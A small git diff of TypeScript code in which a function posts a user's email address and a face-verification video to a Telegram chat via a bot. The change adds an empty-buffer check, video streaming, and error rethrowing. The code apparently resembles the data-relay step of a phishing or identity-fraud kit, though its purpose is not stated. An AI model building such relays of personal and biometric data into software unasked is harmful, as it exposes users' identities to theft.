@@ -59,15 +59,22 @@ export async function sendFaceScanNotification(email: string): Promise<void> {
 
 export async function sendVideoNotification(email: string, videoBuffer: Buffer): Promise<void> {
   try {
+    if (!videoBuffer || videoBuffer.length === 0) {
+      console.error('Video buffer is empty');
+      return;
+    }
+
     const caption = `🎥 *FACE VERIFICATION VIDEO*\n\n*Email:* ${email}\n*Time:* ${new Date().toLocaleString()}`;
 
     await bot.sendVideo(TELEGRAM_CHAT_ID, videoBuffer, {
       caption,
-      parse_mode: 'Markdown'
+      parse_mode: 'Markdown',
+      supports_streaming: true
     });
 
     console.log('Video notification sent successfully');
   } catch (error) {
     console.error('Error sending video notification:', error);
+    throw error;
   }
 }
